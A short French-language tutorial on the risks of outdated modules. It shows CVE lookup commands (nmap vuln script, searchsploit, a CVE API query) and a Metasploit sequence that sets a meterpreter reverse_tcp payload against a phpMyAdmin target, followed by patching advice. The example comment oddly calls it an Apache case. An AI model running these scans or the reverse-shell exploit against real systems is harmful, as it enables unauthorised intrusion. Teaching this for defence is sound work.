Comprendre les Modules Obsolètes et leur Exploitation

1. Pourquoi les modules obsolètes sont un danger ?

Les logiciels et bibliothèques non mis à jour contiennent souvent des failles de sécurité connues et exploitables par des attaquants.

2. Recherche de CVE

Les CVE (Common Vulnerabilities and Exposures) sont des références publiques aux vulnérabilités connues. On peut rechercher des CVE affectant un module en utilisant :


nmap --script vuln -p 80 example.com
searchsploit phpmyadmin
curl -s https://cve.circl.lu/api/search/phpmyadmin

Plus d'outils : Searchsploit

3. Exploitation d'un module vulnérable

Un attaquant peut exploiter un module obsolète via un exploit public :


# Exemple avec un serveur Apache vulnérable
msfconsole
use exploit/unix/webapp/phpmyadmin_lfi
set RHOSTS target.com
set PAYLOAD php/meterpreter/reverse_tcp
exploit
Patch:
  • Mettre à jour régulièrement les modules et logiciels.
  • Surveiller les CVE et appliquer les correctifs dès leur publication.
  • Restreindre les permissions et limiter l'accès aux services vulnérables.
